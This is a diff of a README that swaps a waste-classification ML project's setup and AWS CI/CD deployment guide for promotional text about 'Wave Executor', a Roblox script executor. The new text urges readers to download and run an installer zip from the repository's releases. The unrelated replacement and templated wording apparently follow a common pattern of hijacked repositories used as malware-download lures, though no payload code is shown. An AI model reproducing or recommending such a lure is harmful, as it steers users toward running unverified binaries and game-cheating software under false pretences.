@@ -1,119 +1,62 @@
+# Wave Executor
 
-## Workflows
+![Wave Executor Preview](/static/nnelentu.webp)
 
-1. constants
-2. entity
-3. components
-4. pipelines
-5. app.py
+## Description
 
+[comment]: <> (This is where you can provide a detailed description of your project. Talk about what your project is, what it does, and why you made it. Consider adding images or diagrams to make it more engaging. You can also outline the key features and functionalities.)
 
-# How to run?
-### STEPS:
+Welcome to Wave Executor, a robust Windows-based script executor tailored for Roblox enthusiasts. Wave Executor sets itself apart with AI integration for seamless script development, ad-free premium features, and 24/7 support, all aimed at ensuring an unparalleled user experience and taking your gameplay to new heights.
 
-Clone the repository
+## Key Features
 
-```bash
-https://github.com/kishorekumarm28/waste-thursday
+- AI Integration for Seamless Script Development
+- Ad-Free Premium Features
+- 24/7 Support
+
+## Table of Contents
+
+1. [Installation](#installation)
+2. [Usage](#usage)
+3. [Support](#support)
+4. [License](#license)
+
+## Installation
+
+[comment]: <> (Provide steps to install your project, including any dependencies or requirements. You could add code snippets to guide users through the process.)
+
+To install Wave Executor, follow these steps:
+
+1. Download the Wave Executor installer from the following link: [Download Wave Executor](../../releases)
+2. Run the installer on your Windows machine.
+3. Follow the on-screen instructions to complete the installation process.
+
+## Usage
+
+[comment]: <> (Here you can demonstrate how to use your project. Include examples, tutorials, or screenshots to make it easier for users to understand.)
+
+Once Wave Executor is installed, you can launch the application and begin leveraging its powerful features, such as AI integration for script development. The intuitive user interface makes executing scripts a breeze, allowing you to enhance your Roblox gameplay effortlessly.
+
+Here's a simple example of how to execute a script using Wave Executor:
+
+```lua
+-- Your Lua script goes here
 ```
-### STEP 01- Create a conda environment after opening the repository
 
-```bash
-conda create -n waste python=3.7 -y
-```
+## Support
 
-```bash
-conda activate waste
-```
+[comment]: <> (If users have any questions or need help with your project, this is the place to provide support options. You can list your email address, link to a FAQ page, or direct them to open an issue on GitHub.)
 
+If you require any assistance with Wave Executor or have any questions, feel free to reach out to our dedicated support team. You can contact us at [support@waveexecutor.com](mailto:support@waveexecutor.com), and we'll be happy to help.
 
-### STEP 02- install the requirements
-```bash
-pip install -r requirements.txt
-```
+## License
 
+[comment]: <> (Specify the license under which the project is distributed. Provide a link to the license file if needed.)
 
-```bash
-# Finally run the following command
-python app.py
-```
+Wave Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-Now,
-```bash
-open up you local host and port
-```
+---
 
+[Wave Executor](https://waveexecutor.com) - Elevate your Roblox gameplay with Wave Executor! 🌊🚀
 
-
-# AWS-CICD-Deployment-with-Github-Actions
-
-## 1. Login to AWS console.
-
-## 2. Create IAM user for deployment
-
-	#with specific access
-
-	1. EC2 access : It is virtual machine
-
-	2. ECR: Elastic Container registry to save your docker image in aws
-
-
-	#Description: About the deployment
-
-	1. Build docker image of the source code
-
-	2. Push your docker image to ECR
-
-	3. Launch Your EC2 
-
-	4. Pull Your image from ECR in EC2
-
-	5. Lauch your docker image in EC2
-
-	#Policy:
-
-	1. AmazonEC2ContainerRegistryFullAccess
-
-	2. AmazonEC2FullAccess
-
-	
-## 3. Create ECR repo to store/save docker image
-    - Save the URI: 566373416292.dkr.ecr.ap-south-1.amazonaws.com/waste
-
-	
-## 4. Create EC2 machine (Ubuntu) 
-
-## 5. Open EC2 and Install docker in EC2 Machine:
-	
-	
-	#optinal
-
-	sudo apt-get update -y
-
-	sudo apt-get upgrade
-	
-	#required
-
-	curl -fsSL https://get.docker.com -o get-docker.sh
-
-	sudo sh get-docker.sh
-
-	sudo usermod -aG docker ubuntu
-
-	newgrp docker
-	
-# 6. Configure EC2 as self-hosted runner:
-    setting>actions>runner>new self hosted runner> choose os> then run command one by one
-
-
-# 7. Setup github secrets:
-
-    AWS_ACCESS_KEY_ID=
-
-    AWS_SECRET_ACCESS_KEY=
-
-    AWS_REGION = us-east-1
-
-    AWS_ECR_LOGIN_URI = demo>>  566373416292.dkr.ecr.ap-south-1.amazonaws.com
-
-    ECR_REPOSITORY_NAME = simple-app
+[![Download Wave Executor](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](../../releases)
